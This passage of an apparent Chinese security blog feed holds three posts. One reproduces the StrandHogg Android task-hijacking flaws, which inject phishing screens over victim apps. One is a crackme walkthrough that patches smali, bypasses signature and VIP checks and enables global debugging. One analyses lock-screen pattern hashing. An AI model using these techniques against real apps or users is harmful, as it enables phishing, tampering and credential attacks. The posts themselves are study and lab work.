的taskAffinity，它的值为 Manifest 的包名，也就是taskAffinity默认属性为自身应用包名的字符串。那么该应用中的所有 Activity 都具有同一相似性。具有相同taskAffinity属性的 Activity归属同一任务（从用户的角度来看，则是归属同一“应用”），甚至可以在一个任务栈中放置不同应用中定义的Activity。如果指定 Activity 与任何任务均无相似性，可以将其设置为空字符串。</p><p>allowTaskReparenting（任务重编）：这个属性会使该Activity具有在任务栈被重新编排的能力，当下一次将启动 Activity 的任务转至前台时， Activity 是否可以从启动它的任务移动到和它具有相同taskAffinity属性的任务，转移的时机是在具有相同taskAffinity属性的任务转移到前台时，true代表能够移动，false表示它必须留在它所在的任务中。它不会立即将攻击者活动转移到其目标上。只是当下次启动目标任务时，Android 操作系统会评估所有任务和活动，并查找标记有此属性的活动并在启动相关任务之前移动它们。由于任务栈的taskAffinity值与该栈中的根Activity永远一致，具有“singleTask”或“singleInstance”启动模式的 Activity 只能位于任务的根，因此Android 的官方文档认为这两种启动模式对allowTaskReparenting是没有意义的，但该漏洞利用的就是看似没有意义的singleTask启动模式。这样可以使恶意的Activity放到受害应用的任务栈的根位置。如果未设置此 allowTaskReparenting 属性，则元素的相应属性设置默认值为 false。</p><h1 id="1-StrandHogg1-0"><a href="#1-StrandHogg1-0" class="headerlink" title="1. StrandHogg1.0"></a>1. StrandHogg1.0</h1><h2 id="1-1-漏洞介绍"><a href="#1-1-漏洞介绍" class="headerlink" title="1.1 漏洞介绍"></a>1.1 漏洞介绍</h2><p>该漏洞为一个 Android 任务栈劫持漏洞，在2019年披露，影响范围包括Android 10以下。该漏洞可以让恶意应用注入一个Activity到它设定好的受害应用的顶层，因此恶意应用可以精心设计一个具有诱导性的Activity注入到受害应用中进行攻击。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>因为大部分应用的taskAffinity属性都没有设置，默认为其包名，那么就可以在恶意应用的一个Activity标签中，设置与受害应用包名一致的taskAffinity值。该Activity(下称hackActivity)启动的时候就会创建一个与受害应用的taskAffinity属性相同的一个任务栈，到时候会和受害应用共享一个任务栈，并且位于该任务栈的根。在我们启动受害应用时，受害应用的任务就会被放到前台，然后位于根的hackActivity就会放到前台，那么当我们打开受害应用所看到的Activity，并不是该应用原有的Activity，而是我们的hackActivity。我们可以将hackActivity设计成一个钓鱼页面，实现钓鱼攻击，获取用户的隐私和诱导用户授予恶意软件相应权限。</p><h2 id="1-3-漏洞复现"><a href="#1-3-漏洞复现" class="headerlink" title="1.3 漏洞复现"></a>1.3 漏洞复现</h2><p>假设受害应用的包名为<code>com.zj.wuaipojie</code>。现在我们设计一个恶意应用，恶意应用中有三个Activity：MainActivity用来启动其它的Activity，Innocent是用来伪装自己的，通常是一个无害的界面，Hack则是一个钓鱼界面。Hack中设allowTaskReparenting和taskAffinity两个属性，taskAffinity设计为受害应用的包名，但是没有设计启动模式为singleTask，只是在启动这个Activity时，会对intent传入一个参数FLAG_ACTIVITY_NEW_TASK，这个跟singleTask的作用是类似的。</p><img src="/posts/25a1b417/1.1.1.png" class=""><img src="/posts/25a1b417/1.1.2.png" class=""><p>此时点击恶意应用，在CMD输入<code>adb shell dumpsys activity activities</code>查看任务栈。可以看到<code>MainActivity.class</code>与<code>Innocent.class</code>处在同一个任务栈，而<code>Hack.class</code>在另一个任务栈。</p><img src="/posts/25a1b417/1.1.3.png" class=""><img src="/posts/25a1b417/1.1.4.png" class=""><p>此时有三种情况可以达到钓鱼目的：</p><ol><li>先启动受害应用，点击返回键或Home键切回到桌面，启动恶意应用，点击Home键或页面切换键回到受害应用，发现页面已更改。<br>这里为什么要点击Home键或页面切换键而不是返回键呢？正常来说，点击返回键会返回到桌面，而不是返回到另一个任务栈中。但是按照我们上面的实现方法，在恶意应用中点击返回键会去到我们的钓鱼页面，此时很有可能会被发现端倪。</li><li>启动恶意应用，点击Home键，启动受害应用，发现页面已更改。<br>如果在恶意应用中点击返回键会去到钓鱼页面，但用户之前并没有启动过受害应用，所以这个钓鱼就更明显了。</li><li>启动恶意应用，点击页面切换键去到非受害应用（此时受害应用还未加载，所以不可能通过页面切换键去到受害应用），在非受害应用中点击返回键或Home键，再启动受害应用，发现页面已更改。</li></ol><p>这三种情况看似苛刻，但如果钓鱼页面做得足够精良，其实很难发现端倪的，生活中绝大部分人在玩手机的时候应该不会特意记住自己打开了什么软件，顺序是怎样的。</p><p>这里还有一个问题，为什么要设置Innocent？如果不设置，点击恶意应用，由于<code>startActivity()</code>的原因会让Hack在MainActivity之上，所以恶意应用为了掩盖自己的真实意图，需要再<code>startActivity()</code>一个Innocent，让用户看不到“不应该出现在这个应用的界面”，达到伪装目的。</p><img src="/posts/25a1b417/1.1.5.png" class=""><h1 id="2-StrandHogg2-0（CVE-2020-0096）"><a href="#2-StrandHogg2-0（CVE-2020-0096）" class="headerlink" title="2. StrandHogg2.0（CVE-2020-0096）"></a>2. StrandHogg2.0（CVE-2020-0096）</h1><h2 id="2-1-漏洞介绍"><a href="#2-1-漏洞介绍" class="headerlink" title="2.1 漏洞介绍"></a>2.1 漏洞介绍</h2><p>StrandHogg2.0和StrandHogg1.0均为同一家公司promo披露，相比StrandHogg1.0必须明确地将他们的目标应用程序硬编码到 Android Manifest，StrandHogg2.0并不需要在<code>AndroidManifest.xml</code>上进行设计，而是在代码中实现，如有需要可以动态修改注入的应用程序，也可以同时对多个程序进行劫持。影响范围为Android 8和Andorid 9。</p><h2 id="2-2-漏洞原理"><a href="#2-2-漏洞原理" class="headerlink" title="2.2 漏洞原理"></a>2.2 漏洞原理</h2><p>这个漏洞主要是利用<code>startActivities()</code>这个API，它的功能是一次启动多个Activity，传入一个intent数组，Android会解析每个intent，并逐个启动它们。<code>startActivities()</code>默认认为intent数组第一个Activity的启动者是当前应用，而第二个Activity的启动者是第一个Activity所属的那个应用，以此类推，那么我们只要控制将第一个Activity的所有者设为我们所要攻击的受害应用，那么就可以让我们的hackActivity被受害应用启动，实现Activity劫持。</p><h2 id="2-3-漏洞复现"><a href="#2-3-漏洞复现" class="headerlink" title="2.3 漏洞复现"></a>2.3 漏洞复现</h2><p>在StrandHogg1.0的基础上，可以去掉allowTaskReparenting和taskAffinity属性，修改MainActivity，Intents[0]需要设置的是受害应用的包名和包名+可导出类名，从而使得Intents[1]里的Activity能够从受害应用中启动，就可以实现页面替换。</p><p>可导出类名可用drozer工具探测，一般MainActivity都是可导出的。</p><img src="/posts/25a1b417/2.1.2.png" class=""><img src="/posts/25a1b417/2.1.3.png" class=""><p>与StranHogg1.0同样以上三种情况可以达到钓鱼目的，但是2、3情况，对于有开屏广告的应用程序不适用，比如yiqi,weibo等。点击受害应用后，卡在了钓鱼页面几秒，再播放广告，正常进入MainActivity。而StranHogg1.0是可以对抗开屏广告的，因为启动受害应用，ui.MainActivity入栈，但由于Hack的启动模式为singleTask，会将上面的ui.MainActivity出栈，让Hack位于栈顶。</p><h1 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3. 漏洞修复"></a>3. 漏洞修复</h1><p>现在taskAffinity属性只对相同UID的应用有效，也就是说，只有共享UID的应用才可以进行Activity的移动，UID在应用安装时被分配，并且在应用存在于手机上期间，都不会改变。一个应用程序只能有一个UID，多个应用可以使用sharedUserId 方式共享同一个UID，但前提是这些应用的签名要相同。恶意应用也无法伪造UID，导致无法实现攻击。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;StrandHogg是一个 Android 任务栈劫持漏洞，属于应用层漏洞。&lt;/p&gt;
&lt;p&gt;参考文章：&lt;a href=&quot;https://bbs.pediy.com/thread-271459.htm&quot;&gt;Android strandhogg漏洞复现学习&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解《安卓逆向这档事》另类破解</title>
    <link href="http://example.com/posts/7c87ee99.html"/>
    <id>http://example.com/posts/7c87ee99.html</id>
    <published>2022-10-27T14:12:50.725Z</published>
    <updated>2022-11-18T01:46:18.091Z</updated>
    
    <content type="html"><![CDATA[<p>正己大佬课程中用到的APK，看了几集他的解法，很快很迅速，有些小工具挺好用的。他的解法看视频就好了，我就在这分享一下我的解法。</p><span id="more"></span><h1 id="1-第一关"><a href="#1-第一关" class="headerlink" title="1. 第一关"></a>1. 第一关</h1><img src="/posts/7c87ee99/1.1.1.png" class=""><p>载入GDA，程序无壳，入口类为<code>com.zj.wuaipojie.ui.MainActivity</code>。</p><img src="/posts/7c87ee99/1.1.2.png" class=""><p>既然它是让我们修改某个Activity中的文字和图片信息，那就直接用Android Killer来反编译APK并修改。发现在DEX文件转换为JAR文件时出错了，提示我们不支持该版本的DEX文件。</p><img src="/posts/7c87ee99/1.1.5.png" class=""><p>这是因为AK中的dex2jar工具版本太旧了，在网上下载最新版本的<a href="https://github.com/pxb1988/dex2jar">dex2jar</a>将它替换即可。</p><img src="/posts/7c87ee99/1.1.7.png" class=""><p>此时再次反编译APK就没问题了。</p><img src="/posts/7c87ee99/1.1.6.png" class=""><p>搜索关键字符串，找到资源定位，并进行汉化。</p><img src="/posts/7c87ee99/1.1.3.png" class=""><p>查看其它字符串或图片，都是建了一个索引，我们找到这些索引并修改其中的字符串或图片即可。</p><img src="/posts/7c87ee99/1.1.4.png" class=""><p>比如替换图片，在res目录下找到对应位置，或直接搜索“first_img.jpg”，替换为其它图片。</p><img src="/posts/7c87ee99/1.1.9.png" class=""><img src="/posts/7c87ee99/1.1.8.png" class=""><p>比如汉化文字，同样操作。</p><img src="/posts/7c87ee99/1.1.10.png" class=""><img src="/posts/7c87ee99/1.1.11.png" class=""><p>但我们发现在<code>activity_challenge_first.xml</code>中没有找到英语的索引。搜索该字符串发现在代码中定义了。</p><img src="/posts/7c87ee99/1.1.12.png" class=""><p>在代码中不能直接输入中文，需要转成Unicode编码再写入到代码中。</p><img src="/posts/7c87ee99/1.1.13.jpg" class=""><p>重新编译打包，发现编译时又出现了一个错误：</p><img src="/posts/7c87ee99/1.1.14.png" class=""><p>这是因为aapt2才支持navigation，而AndroidKiller默认采用aapt。所以我们只能手动打包一下，加上<code>--use-aapt2</code>选项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b Project -o wuaipojie.apk --use-aapt2</span><br></pre></td></tr></table></figure><p>又出错了，提示在<code>AndroidManifest.xml</code>的第4行的<code>android:dataExtractionRules</code>属性没有找到，有点奇怪为什么没有找到，不是在项目里面吗？不过它是个云备份功能，没有也行。</p><img src="/posts/7c87ee99/1.1.15.jpg" class=""><img src="/posts/7c87ee99/1.1.16.png" class=""><p>直接在<code>AndroidManifest.xml</code>中删掉这个属性，重新编译就成功了。然后继续用Android Killer帮APK签名。</p><img src="/posts/7c87ee99/1.1.18.png" class=""><p>卸载手机上的源APK，安装修改好后的APK，噔噔~成功啦！</p><img src="/posts/7c87ee99/1.1.17.png" class=""><p>这节课的内容还有一个应用双开的知识。其实就是修改包名，因为Android系统是根据包名来判断是否是同一个应用程序。</p><img src="/posts/7c87ee99/1.1.19.png" class=""><p>如果是相同包名，在<code>adb install</code>时就失败了，因为相同包名而不同签名的应用是不能被安装的。这也是为什么我们安装修改后的APK前要先卸载源APK。查看用户安装的所有应用的包名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list packages -3</span><br></pre></td></tr></table></figure><img src="/posts/7c87ee99/1.1.20.png" class=""><h1 id="2-第二关"><a href="#2-第二关" class="headerlink" title="2. 第二关"></a>2. 第二关</h1><img src="/posts/7c87ee99/2.1.1.png" class=""><p>一键三连还要充值大会员？我bp不香吗(bushi</p><p>使用jadx查看Java源码，成功一键三连有两个条件：</p><ol><li>硬币数至少10个</li><li>是大会员</li></ol><img src="/posts/7c87ee99/2.1.2.png" class=""><p>那我们只要将硬币数修改为10以上，将<code>isvip()</code>方法的返回值改为true就可以了。直接修改Smali代码。</p><p>在分析Smali代码的过程中，发现都是用参数寄存器来存储硬币值，不太好直接修改。那我们就修改硬币的递增值。正常来说，按一次“获取硬币”增加一个硬币，我们可以修改为按一次“获取硬币”增加N个硬币。值也不能取太大，最大为0x7f。</p><img src="/posts/7c87ee99/2.1.3.png" class=""><img src="/posts/7c87ee99/2.1.4.jpg" class=""><p>把<code>isvip()</code>方法的返回值修改为0x1，表示true。</p><img src="/posts/7c87ee99/2.1.5.png" class=""><p>同样方法打包签名，实现了每次增加127枚硬币，点击一键三连成功变蓝。</p><img src="/posts/7c87ee99/2.1.6.png" class=""><p>还有一种方法就是绕过硬币数量判断，这样就不用点击“获取硬币”就可“一键三连”了。</p><h1 id="3-第三关"><a href="#3-第三关" class="headerlink" title="3. 第三关"></a>3. 第三关</h1><p>在开启第三关的前3s，有一个启动广告。由于查看<code>ChanllengeThird.class</code>并没有发现相关内容，所以需要找到该Activity。使用Android SDK中的<code>uiautomatorviewer.bat</code>工具查看该页面的相关信息，发现这个图片资源id为imageView2。</p><img src="/posts/7c87ee99/3.1.2.png" class=""><p>到AK中搜索一下果然有所发现，该页面其实是<code>AdActivity.class</code>。</p><img src="/posts/7c87ee99/3.1.3.png" class=""><p>这个页面我们是不想要的，所以在jadx中查看哪里调用了它，再将它去掉即可。我们发现在第一第二关中，都去到了相对应的挑战页面，而到了第三关，就去到了广告页面。我们可以尝试修改为去到挑战三页面。</p><img src="/posts/7c87ee99/3.1.4.png" class=""><img src="/posts/7c87ee99/3.1.5.png" class=""><p>不错，现在第三关一打开就是挑战三的页面了。</p><img src="/posts/7c87ee99/3.1.1.png" class=""><p>这个更新弹窗完全点不掉，发现在<code>ChallengeThird.class</code>的<code>onCreate()</code>方法调用到了它。对于弹窗，一个简单粗暴的方法就是直接在Smali代码中将相关语句删除即可。</p><img src="/posts/7c87ee99/3.1.6.png" class=""><p>还有一种方法，进入<code>checkUpdate()</code>函数分析如何绕过弹窗。那就是现在的APK版本要大于等于它的弹窗指定版本。怎么才能知道它弹窗指定版本是多少呢？它这里开启了一个Service，并有响应请求，可以通过抓包得到弹窗的versionCode。</p><img src="/posts/7c87ee99/3.1.10.png" class=""><p>而应用程序的versionCode在<code>AndroidManifest.xml</code>中，将它的值修改为2及以上即可。但我们发现AK中解析出来的XML文件找不到versionCode，这是因为AXMLPrinter2解析库问题导致，而在jadx或GDA中是可以看到<code>AndroidManifest.xml</code>中的versionCode的。apktool工具还将versionCode和versionName的信息放在了<code>apktool.yml</code>中。</p><p>(单纯解压APK文件，<code>AndroidManifest.xml</code>乱码，需要用apktool工具解析APK文件)</p><p>直接修改<code>apktool.yml</code>中的versionCode并不可行，因为apktool在重打包时，虽然会读取<code>apktool.yml</code>中的versionCode作为参数，但是后面会被<code>AndroidManifest.xml</code>中“隐藏”的versionCode属性覆盖，所以最好的办法是将<code>AndroidManifest.xml</code>中的versionCode和versionName“可视化”。</p><img src="/posts/7c87ee99/3.1.11.png" class=""><p>出现一号广告弹窗，要不就去论坛，要不就直接退出第三关。但此时按手机上的返回键还是可以关闭弹窗，返回到第三关界面的。但是二号广告弹窗就不能按返回键了。</p><img src="/posts/7c87ee99/3.1.7.png" class=""><p>做粗暴的做法就是把第28行到53行对应的Smali代码全删掉。</p><img src="/posts/7c87ee99/3.1.8.png" class=""><p>当然如果这个工作量比较大的话，可以将展示弹窗的函数注释掉。</p><img src="/posts/7c87ee99/3.1.12.png" class=""><p>这个横幅广告把页面显示的内容遮挡住了，同样用<code>uiautomatorviewer.bat</code>工具查看这条横幅信息。在布局文件中删掉第11行的语句即可，或者添加一个属性<code>android:visibility=&quot;gone&quot;</code>，再或者修改图片的宽高为0dp。</p><img src="/posts/7c87ee99/2.1.9.jpg" class=""><img src="/posts/7c87ee99/3.1.14.jpg" class=""><img src="/posts/7c87ee99/3.1.15.jpg" class=""><h1 id="4-第四关"><a href="#4-第四关" class="headerlink" title="4. 第四关"></a>4. 第四关</h1><h2 id="4-1-第一种解题方法"><a href="#4-1-第一种解题方法" class="headerlink" title="4.1 第一种解题方法"></a>4.1 第一种解题方法</h2><img src="/posts/7c87ee99/4.1.1.png" class=""><p>关键是看<code>check()</code>方法是如何实现的。</p><img src="/posts/7c87ee99/4.1.2.png" class=""><p>传入的str就是我们输入的密钥，密钥以“flag{”开头，“}”结束。substring就是“flag{xxx}”的xxx。而下面这些语句就是生成密钥的操作，最后与substring比较是否相等。</p><p>我们现在最需要知道的就是string存的是什么，它调用了<code>SPUtils.INSTANCE.getString()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PROJECTION</span> <span class="operator">=</span> <span class="string">&quot;data&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getString</span><span class="params">(Context context, String str, String str2)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> context.getSharedPreferences(PROJECTION, <span class="number">0</span>).getString(str, str2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进而调用了<code>context.getSharedPreferences()</code>方法，从名字上看是得到本地的共享数据信息。应用存储共享数据到本地有固定的目录，为<code>/data/data/[包名]/shared_prefs</code>。在文件名为“data”取出name值为“id”的字符串，也就是“v5le0n9”。如果为空，则取str2的值。</p><p>详情参考这篇文章：<a href="https://blog.csdn.net/u011027547/article/details/121370135">安卓学习专栏——从SharedPreferences中读取数据、SharedPreferences的get方法（图文+代码）</a></p><img src="/posts/7c87ee99/4.1.3.png" class=""><p>所以string存的就是我们的id名。接下来的事就是照搬代码，加密的事情让程序来做就好了，我们只要最后算出来的密钥。</p><img src="/posts/7c87ee99/4.1.4.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell input text &quot;flag&#123;RABeUAJbCwwGAQ==&#125;&quot;</span><br></pre></td></tr></table></figure><img src="/posts/7c87ee99/4.1.5.png" class=""><h2 id="4-2-第二种解题方法"><a href="#4-2-第二种解题方法" class="headerlink" title="4.2 第二种解题方法"></a>4.2 第二种解题方法</h2><p>但这节课的主要内容是用jeb动态调试Smali，说起来很久没有对Smali进行动调了，现在可以复习一下。我在<a href="https://v5le0n9.github.io/posts/15be101a.html#4-AS%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81">Android逆向入门教程</a>中是用Android Studio来动调Smali，使用jeb应该也差不多吧，我们来试试吧。</p><p>动态调试第一步，确保该应用是可被调试的。这里有两种方法：</p><ol><li>编辑<code>AndroidManifest.xml</code>中application标签中的android:debuggable=”true”，再重新打包签名；</li><li>修改Android系统全局可调试ro.debuggable=1。</li></ol><p>第一种大家应该很熟悉了，实在不会我上面那篇文章也有提到。这次主要讲第二种方法，使用到的工具<a href="https://pan.baidu.com/share/init?surl=2wUM3Y8Usrv7DCQCQmRsng&amp;pwd=0s72">mprop</a>。</p><p>选择与手机匹配的架构，目前貌似只有32位的，但在64位的手机上也能用。在全局下开启调试模式意味着系统的所有应用都可被调试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">adb push mprop /data/local/tmp</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod 755 mprop</span><br><span class="line">./mprop ro.debuggable 1</span><br><span class="line">getprop ro.debuggable</span><br><span class="line">stop</span><br><span class="line">start</span><br></pre></td></tr></table></figure><img src="/posts/7c87ee99/4.2.1.png" class=""><p>jeb的动调有两种模式，一种是普通调试(attach模式)，另一种是debug调试(spawn模式)。</p><h3 id="4-2-1-jeb普通调试"><a href="#4-2-1-jeb普通调试" class="headerlink" title="4.2.1 jeb普通调试"></a>4.2.1 jeb普通调试</h3><p>手机打开需要动调的页面，将APK载入jeb去到Activity对应的Smali代码中。Debugger -&gt; Start或点击小虫子，选择对应进程attach。</p><img src="/posts/7c87ee99/4.2.2.png" class=""><p>鼠标选中需要打断点的行，Ctrl+B下断。我们无非是想得到密钥，所以要进去<code>check()</code>里面，在它判断两个字符串是否相等时可以得到真正的密钥。</p><p>虽然它说已安装的程序未标记为“可调试”，但是Android系统开启了全局可调试，所以是可以进行调试的。</p><img src="/posts/7c87ee99/4.2.3.png" class=""><p>按照要求输入伪造密钥，点击“验证”按钮，程序停在断点处，单步执行将真正的密钥存到v0，查看v0的值即可。</p><img src="/posts/7c87ee99/4.2.4.png" class=""><p>结束调试，输入验证一下，密钥正确。</p><img src="/posts/7c87ee99/4.2.5.png" class=""><h3 id="4-2-2-jeb-debug调试"><a href="#4-2-2-jeb-debug调试" class="headerlink" title="4.2.2 jeb debug调试"></a>4.2.2 jeb debug调试</h3><p>用AK得到该程序的包名和入口类：</p><img src="/posts/7c87ee99/4.3.1.png" class=""><p>使用以下命令启动应用进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity</span><br></pre></td></tr></table></figure><img src="/posts/7c87ee99/4.3.2.png" class=""><p>后面就和普通模式一样操作了，不同的是debug模式可以断在<code>MainActivity.onCreate()</code>中，前提是已经在Debugger -&gt; Start前下好断点。</p><img src="/posts/7c87ee99/4.3.3.png" class=""><h2 id="4-3-第三种解题方法"><a href="#4-3-第三种解题方法" class="headerlink" title="4.3 第三种解题方法"></a>4.3 第三种解题方法</h2><p>通过在AK中使用Log插桩的方式，从logcat中得到密钥。如果应用没有进行签名校验，这个方法是最快的。</p><h1 id="5-第五关"><a href="#5-第五关" class="headerlink" title="5. 第五关"></a>5. 第五关</h1><img src="/posts/7c87ee99/5.1.1.png" class=""><p>意思应该让我们把这些校验都通过。载入jadx查看是如何实现这些校验的。</p><img src="/posts/7c87ee99/5.1.2.png" class=""><p>我们一个一个来看。首先是普通签名校验：</p><img src="/posts/7c87ee99/5.1.3.png" class=""><p>从包的信息中取出签名，进行SHA加密再进行Base64编码，查看与硬编码中加密后的签名是否一致。这个绕过不是直接hook <code>checkSign()</code> 函数就好了吗？让它直接返回true。</p><img src="/posts/7c87ee99/5.1.4.png" class=""><p>其它同理可得。</p><img src="/posts/7c87ee99/5.1.5.png" class=""><p>对应的，修改Smali代码逻辑，不让它们走到false即可。</p><p>他这节课的主要内容是Xposed模块编写、主动调用和算法自吐。只不过我用的是Frida框架，这里也貌似没有主动调用的必要，算法自吐我不会，可能要先自学一下或者到时候听课，不过听课可能要等很久。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;正己大佬课程中用到的APK，看了几集他的解法，很快很迅速，有些小工具挺好用的。他的解法看视频就好了，我就在这分享一下我的解法。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Android 8.1.0锁屏密码加密算法分析</title>
    <link href="http://example.com/posts/ecd6d008.html"/>
    <id>http://example.com/posts/ecd6d008.html</id>
    <published>2022-10-24T09:33:02.512Z</published>
    <updated>2022-11-17T06:25:19.922Z</updated>
    
    <content type="html"><![CDATA[<p>看了姜维大佬写的《Android应用安全防护和逆向分析》一书中对Android 5.1的锁屏密码加密算法分析，我也依样画葫芦对我手上的Android 8.1.0锁屏密码加密算法进行分析，其实源码并没有多大改变，我这仅仅只是做一个复现过程。</p><span id="more"></span><h1 id="1-手势密码加密算法分析"><a href="#1-手势密码加密算法分析" class="headerlink" title="1. 手势密码加密算法分析"></a>1. 手势密码加密算法分析</h1><p>将手机与电脑连接，手机运行至锁屏界面，使用<code>D:\Java\Android\sdk\tools\bin\uiautomatorviewer.bat</code>工具截屏手机当前界面，选中图案锁屏可以看到它的resource-id。(找不到有可能tools目录下)</p><img src="/posts/ecd6d008/1.1.1.png" class=""><p>由于是找密码算法，所以有关加密的类需要格外注意。</p><img src="/posts/ecd6d008/1.1.2.png" class=""><h2 id="1-1-patternToHash"><a href="#1-1-patternToHash" class="headerlink" title="1.1 patternToHash()"></a>1.1 patternToHash()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</span></span><br><span class="line"><span class="number">1047</span>      <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] patternToHash(List&lt;LockPatternView.Cell&gt; pattern) &#123;</span><br><span class="line"><span class="number">1048</span>          <span class="keyword">if</span> (pattern == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1049</span>              <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">1050</span>          &#125;</span><br><span class="line"><span class="number">1051</span>  </span><br><span class="line"><span class="number">1052</span>          <span class="keyword">final</span> <span class="type">int</span> <span class="variable">patternSize</span> <span class="operator">=</span> pattern.size();</span><br><span class="line"><span class="number">1053</span>          <span class="type">byte</span>[] res = <span class="keyword">new</span> <span class="title class_">byte</span>[patternSize];</span><br><span class="line"><span class="number">1054</span>          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; patternSize; i++) &#123;</span><br><span class="line"><span class="number">1055</span>              LockPatternView.<span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> pattern.get(i);</span><br><span class="line"><span class="number">1056</span>              res[i] = (<span class="type">byte</span>) (cell.getRow() * <span class="number">3</span> + cell.getColumn());</span><br><span class="line"><span class="number">1057</span>          &#125;</span><br><span class="line"><span class="number">1058</span>          <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">1059</span>              <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>);</span><br><span class="line"><span class="number">1060</span>              <span class="type">byte</span>[] hash = md.digest(res);</span><br><span class="line"><span class="number">1061</span>              <span class="keyword">return</span> hash;</span><br><span class="line"><span class="number">1062</span>          &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException nsa) &#123;</span><br><span class="line"><span class="number">1063</span>              <span class="keyword">return</span> res;</span><br><span class="line"><span class="number">1064</span>          &#125;</span><br><span class="line"><span class="number">1065</span>      &#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-verifyCredential"><a href="#1-2-verifyCredential" class="headerlink" title="1.2 verifyCredential()"></a>1.2 verifyCredential()</h2><p>这个pattern怎么来的呢？查看哪里调用了<code>patternToHash()</code>。看名字这里已经是验证图案的过程了。<code>patternToHash()</code>的参数是经过<code>stringToPattern()</code>方法来的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsService.java</span></span><br><span class="line"><span class="number">1638</span>      <span class="keyword">private</span> VerifyCredentialResponse <span class="title function_">verifyCredential</span><span class="params">(<span class="type">int</span> userId, CredentialHash storedHash,</span></span><br><span class="line"><span class="params"><span class="number">1639</span>              String credential, <span class="type">boolean</span> hasChallenge, <span class="type">long</span> challenge,</span></span><br><span class="line"><span class="params"><span class="number">1640</span>              ICheckCredentialProgressCallback progressCallback)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">1654</span>          <span class="keyword">if</span> (storedHash.version == CredentialHash.VERSION_LEGACY) &#123;</span><br><span class="line"><span class="number">1655</span>              <span class="keyword">final</span> <span class="type">byte</span>[] hash;</span><br><span class="line"><span class="number">1656</span>              <span class="keyword">if</span> (storedHash.type == LockPatternUtils.CREDENTIAL_TYPE_PATTERN) &#123;</span><br><span class="line"><span class="number">1657</span>                  hash = LockPatternUtils.patternToHash(LockPatternUtils.stringToPattern(credential));</span><br><span class="line"><span class="number">1658</span>              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">1659</span>                  hash = mLockPatternUtils.passwordToHash(credential, userId);</span><br><span class="line"><span class="number">1660</span>              &#125;</span><br><span class="line"><span class="number">1661</span>              <span class="keyword">if</span> (Arrays.equals(hash, storedHash.hash)) &#123;</span><br><span class="line"><span class="number">1662</span>                  <span class="keyword">if</span> (storedHash.type == 